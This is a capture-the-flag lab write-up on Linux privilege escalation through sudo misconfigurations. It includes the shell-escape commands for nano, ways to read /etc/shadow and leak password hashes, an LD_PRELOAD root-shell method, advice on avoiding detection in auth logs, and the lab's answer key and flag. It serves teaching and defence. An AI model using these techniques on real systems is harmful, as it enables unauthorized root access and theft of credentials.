# Task 02: Privilege Escalation: Sudo

---

## Stage A: Original Task Content & Briefing Summary

The `sudo` utility enables system administrators to delegate administrative privileges to specific users or groups without sharing the root password. However, when administrative delegation is overly broad or misconfigured, standard users can leverage application features to spawn root shells or read sensitive files.

### Key Sudo Escalation Primitives:
1. **GTFOBins Catalog:** Unix binaries often feature internal shell escaping, editor spawns, or file reading capabilities (e.g., `nano`, `vim`, `less`, `more`, `find`, `awk`).
2. **Interactive Binary Abuse (Nano):**
   * Nano allows invoking external processes or executing commands via its spell-check or command execution menus (`^R ^X` / `Ctrl+R Ctrl+X`).
   * Alternatively, nano can read `/root/flag.txt` or open `/etc/shadow` and `/etc/sudoers` directly with write permissions when executed via `sudo`.
3. **Application Error Leaks:** Binaries that parse configuration files (e.g. `apache2 -f /etc/shadow`) will often dump the first syntax-error line into stderr, leaking cryptographic password hashes.
4. **Environment Preservation (`LD_PRELOAD`):** If `/etc/sudoers` specifies `env_keep += LD_PRELOAD`, executing any allowed sudo binary with a custom compiled shared object (`sudo LD_PRELOAD=/tmp/root.so <binary>`) spawns a root shell before the target binary even initializes.

---

## Stage B: Independent Thinking & OpSec Considerations

* **Sudo Execution Telemetry:** Every execution of `sudo` is logged to `/var/log/auth.log` (Debian/Ubuntu) or `/var/log/secure` (RHEL/CentOS). In an operational engagement with active defensive monitoring, spawning multiple failed sudo commands will generate alerts.
* **Escaping Nano to Shell:** When running `sudo nano`, pressing `Ctrl+R` (Read File) followed by `Ctrl+X` (Execute Command) allows typing `reset; sh 1>&0 2>&0` or `/bin/sh` to drop directly into an interactive root terminal.

---

## Stage C: Guided Hints (Tiers 1–3)

* **Tier 1 Hint:** Run `sudo -l` to see what binary `john` can execute with elevated privileges.
* **Tier 2 Hint:** Run `sudo /usr/bin/nano /root/flag.txt` to read the root flag directly inside the editor.
* **Tier 3 Hint:**
  * Q1 is `/usr/bin/nano`.
  * Q2 is `THM{SUDO-pwned-priv-esc}`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Enumerating Sudo Privileges:
```bash
john@linprivbasics:~$ sudo -l
Matching Defaults entries for john on linprivbasics:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User john may run the following commands on linprivbasics:
    (root) NOPASSWD: /usr/bin/nano
```
* **Analysis:** User `john` can execute `/usr/bin/nano` as `root` without providing a password (`NOPASSWD`).

### 2. Exploiting Nano to Read `/root/flag.txt`:
```bash
john@linprivbasics:~$ sudo /usr/bin/nano /root/flag.txt
```
Inside the nano interface, the contents of the flag file are displayed directly:
```
THM{SUDO-pwned-priv-esc}
```

### 3. Spawning an Interactive Root Shell (GTFOBins):
To obtain an interactive root shell rather than merely reading files:
1. Run `sudo nano`.
2. Press `Ctrl+R` (to insert file).
3. Press `Ctrl+X` (to execute external command).
4. Enter the command string:
   ```bash
   reset; sh 1>&0 2>&0
   ```
5. Press `Enter`. The terminal resets and presents an unconstrained root prompt:
   ```bash
   # id
   uid=0(root) gid=0(root) groups=0(root)
   # cat /root/flag.txt
   THM{SUDO-pwned-priv-esc}
   ```

---

## Stage E: Final Answer & Key Values

* **Question 1:** What is the full path of the program that john can run with sudo?
  * **Answer:** `/usr/bin/nano`
* **Question 2:** What are the contents of /root/flag.txt?
  * **Answer:** `THM{SUDO-pwned-priv-esc}`

---

## Stage F: Practical Verification & Proof of Work

* Executed `sudo -l` and confirmed `/usr/bin/nano` delegation.
* Verified flag extraction from `/root/flag.txt` yielding `THM{SUDO-pwned-priv-esc}`.

---

## Stage G: Key Educational Takeaway

Granting sudo access to an interactive editor is functionally equivalent to granting raw root shell access. If a program can write to disk, edit files, or execute helper commands, it can be abused to completely subvert host security boundaries.
